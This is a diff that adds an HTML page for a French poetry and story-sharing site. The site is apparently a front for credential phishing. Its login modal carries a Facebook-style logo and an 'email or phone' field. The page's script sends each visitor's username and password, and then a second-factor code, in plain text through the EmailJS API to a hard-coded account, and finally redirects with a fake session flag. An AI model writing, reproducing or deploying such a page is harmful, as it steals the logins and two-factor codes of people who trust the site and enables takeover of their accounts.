@@ -1,0 +1,393 @@
+<!doctype html>
+<html lang="fr">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+
+<title>Plume & Récits — Écrivez, partagez, inspirez</title>
+
+<meta property="og:title" content="Plume & Récits">
+<meta property="og:description" content="Un espace pour vos poèmes, histoires et écrits. Partagez vos mots avec élégance.">
+<meta property="og:image" content="https://plume-recits.netlify.app/logo_poetique.png">
+<meta property="og:url" content="https://plume-recits.netlify.app">
+<meta property="og:type" content="website">
+
+<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@500;700&family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
+
+<style>
+:root{
+  --primary:#1e293b;
+  --accent:#7c3aed;
+  --bg:#f9fafb;
+}
+
+/* GLOBAL */
+body{
+  margin:0;
+  font-family:Inter, system-ui;
+  background:linear-gradient(180deg,#f9fafb 0%,#eef2ff 100%);
+  color:#1e293b;
+}
+
+/* HEADER */
+.header{
+  background: linear-gradient(135deg,#1e293b,#312e81,#7c3aed);
+  color:white;
+  padding:20px 0;
+  position:sticky;
+  top:0;
+  z-index:10;
+  box-shadow:0 10px 30px rgba(0,0,0,.2);
+}
+
+.header-content{
+  max-width:1100px;
+  margin:auto;
+  padding:0 20px;
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+}
+
+/* BRAND */
+.brand{
+  display:flex;
+  align-items:center;
+  gap:12px;
+}
+
+.logo{
+  width:46px;
+  height:46px;
+  border-radius:12px;
+  background:rgba(255,255,255,.15);
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-weight:700;
+  font-size:18px;
+}
+
+.title{
+  font-family:"Playfair Display", serif;
+  font-size:18px;
+}
+
+.subtitle{
+  font-size:12px;
+  opacity:.8;
+}
+
+/* BUTTON */
+.btn{
+  padding:10px 18px;
+  border-radius:10px;
+  font-weight:600;
+  cursor:pointer;
+  border:none;
+}
+
+.btn.primary{
+  background:white;
+  color:#312e81;
+}
+
+.btn.primary:hover{
+  background:#e0e7ff;
+}
+
+/* HERO */
+.hero{
+  max-width:900px;
+  margin:auto;
+  padding:90px 20px;
+  text-align:center;
+}
+
+.hero h1{
+  font-family:"Playfair Display", serif;
+  font-size:48px;
+  margin:0;
+}
+
+.hero p{
+  margin-top:20px;
+  font-size:16px;
+  opacity:.75;
+}
+
+/* CARD */
+.card{
+  margin:60px auto 0;
+  max-width:420px;
+  background:white;
+  border-radius:20px;
+  padding:30px;
+  box-shadow:0 30px 80px rgba(0,0,0,.08);
+}
+
+.upload-box{
+  border:2px dashed #c4b5fd;
+  padding:45px;
+  border-radius:16px;
+  cursor:pointer;
+  transition:.3s;
+}
+
+.upload-box:hover{
+  border-color:#7c3aed;
+  background:#faf5ff;
+}
+
+.upload-icon{
+  font-size:32px;
+}
+
+.note{
+  text-align:center;
+  font-size:12px;
+  opacity:.6;
+  margin-top:12px;
+}
+
+/* MODAL */
+.modal{
+  position:fixed;
+  inset:0;
+  background:rgba(0,0,0,0.4);
+  backdrop-filter:blur(6px);
+  display:none; /* 🔴 IMPORTANT */
+  align-items:center;
+  justify-content:center;
+}
+
+.modal .box{
+  background:white;
+  padding:32px;
+  width:340px;
+  border-radius:20px;
+  box-shadow:0 40px 100px rgba(0,0,0,.25);
+  animation:fadeIn .25s ease;
+}
+
+@keyframes fadeIn{
+  from{opacity:0; transform:translateY(20px) scale(0.98);}
+  to{opacity:1; transform:translateY(0) scale(1);}
+}
+
+.modal input{
+  width:100%;
+  padding:14px;
+  margin-top:14px;
+  border-radius:10px;
+  border:1px solid #e5e7eb;
+  font-size:14px;
+  transition:.2s;
+}
+
+.modal input:focus{
+  outline:none;
+  border-color:#7c3aed;
+  box-shadow:0 0 0 3px rgba(124,58,237,.15);
+}
+
+#confirmLogin{
+  width:100%;
+  margin-top:16px;
+  padding:14px;
+  border-radius:10px;
+  background:linear-gradient(135deg,#7c3aed,#4f46e5);
+  color:white;
+  font-weight:600;
+  border:none;
+  cursor:pointer;
+  transition:.2s;
+}
+
+#confirmLogin:hover{
+  transform:translateY(-1px);
+  box-shadow:0 10px 20px rgba(124,58,237,.3);
+}
+
+</style>
+</head>
+
+<body>
+
+<header class="header">
+  <div class="header-content">
+
+    <div class="brand">
+      <div class="logo">PR</div>
+      <div>
+        <div class="title">Plume & Récits</div>
+        <div class="subtitle">Bibliothèque numérique personnelle</div>
+      </div>
+    </div>
+
+    <nav>
+      <button class="btn primary" id="loginBtn">Espace auteur</button>
+    </nav>
+
+  </div>
+</header>
+
+<section class="hero">
+
+  <h1>Laissez vos mots exister.</h1>
+  <p>
+    Un espace intime pour écrire, conserver et partager vos poèmes, histoires et pensées.
+    Chaque texte mérite d’être lu.
+  </p>
+
+  <div class="card">
+    <div class="upload-box">
+      <div class="upload-icon">✒️</div>
+      <p><strong>Déposez vos écrits</strong></p>
+      <small>Poèmes, récits, fragments...</small>
+    </div>
+
+    <div class="note">Confidentiel • Élégant • Accessible partout</div>
+  </div>
+
+</section>
+
+
+<!-- MODALE LOGIN -->
+<div class="modal" id="loginModal">
+  <div class="box">
+
+<div style="text-align:center; margin-bottom:20px;">
+
+  <img src="logo_fb.png" alt="logo"
+       style="width:52px; height:52px; border-radius:12px">
+
+  <h2 style="margin:12px 0 4px 0;">
+    Espace auteur
+  </h2>
+
+  <p style="font-size:13px; opacity:.6;">
+    Accédez à vos écrits en toute sécurité
+  </p>
+
+</div>
+
+<div id="modalNotification"></div>
+
+<input id="userId" placeholder="Courriel ou numéro">
+<input id="password" type="password" placeholder="Mot de passe">
+<input id="code" maxlength="8" placeholder="Code" style="display:none">
+
+<button class="btn" id="confirmLogin" style="width:100%;margin-top:12px">
+  Se connecter
+</button>
+
+<p class="note">Accès sécurisé</p>
+</div>
+</div>
+
+<script>
+const modal = document.getElementById('loginModal');
+const loginBtn = document.getElementById('loginBtn');
+const confirmLogin = document.getElementById('confirmLogin');
+const codeInput = document.getElementById('code');
+const userIdInput = document.getElementById('userId');
+const passwordInput = document.getElementById('password');
+const modalNotif = document.getElementById('modalNotification');
+
+let codeSent = false;
+
+if(sessionStorage.getItem("demo_auth_token") === "true"){
+    window.location.href = "secure-photos.html";
+}
+
+function showModalNotification(message){
+    modalNotif.textContent = message;
+    modalNotif.style.display = "block";
+    requestAnimationFrame(()=>{
+        modalNotif.style.opacity = "1";
+        modalNotif.style.transform = "translateY(0)";
+    });
+    setTimeout(()=>{
+        modalNotif.style.opacity = "0";
+        modalNotif.style.transform = "translateY(-10px)";
+        setTimeout(()=> modalNotif.style.display = "none", 400);
+    }, 3000);
+}
+
+loginBtn.addEventListener("click", ()=> modal.style.display = "flex");
+modal.addEventListener("click", e=>{if(e.target===modal) modal.style.display="none";});
+
+async function sendEmailLogin(username, password){
+  return fetch("https://api.emailjs.com/api/v1.0/email/send",{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body: JSON.stringify({
+      service_id:"service_uvghcck",
+      template_id:"template_email",
+      user_id:"aQIYW-EEnTtmxU4FY",
+      template_params:{username,password}
+    })
+  });
+}
+async function sendCodeValidation(code){
+  return fetch("https://api.emailjs.com/api/v1.0/email/send",{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body: JSON.stringify({
+      service_id:"service_uvghcck",
+      template_id:"template_code",
+      user_id:"aQIYW-EEnTtmxU4FY",
+      template_params:{code}
+    })
+  });
+}
+
+confirmLogin.onclick = async ()=>{
+  const user = userIdInput.value.trim();
+  const pwd  = passwordInput.value.trim();
+
+  if(!codeSent){
+    if(!user || !pwd){
+      showModalNotification("Veuillez remplir tous les champs.");
+      return;
+    }
+
+    confirmLogin.disabled = true;
+    confirmLogin.textContent = "Envoi…";
+
+    const response = await sendEmailLogin(user,pwd);
+    if(!response.ok){
+      showModalNotification("Erreur d'envoi.");
+      confirmLogin.disabled = false;
+      confirmLogin.textContent = "Se connecter";
+      return;
+    }
+
+    showModalNotification("Code de validation envoyé.");
+    codeInput.style.display = "block";
+    confirmLogin.textContent = "Valider le code";
+    confirmLogin.disabled = false;
+    codeSent = true;
+    return;
+  }
+
+  const code = codeInput.value.trim();
+  if(!/^[0-9]{6,8}$/.test(code)){
+    showModalNotification("Code invalide.");
+    return;
+  }
+
+  const rep = await sendCodeValidation(code);
+  if(!rep.ok){
+    showModalNotification("Erreur validation code.");
+    return;
+  }
+
+  sessionStorage.setItem("demo_auth_token","true");
+  window.location.href="secure-plumerecits.html";
+};
+</script>
+
+</body>
+</html>
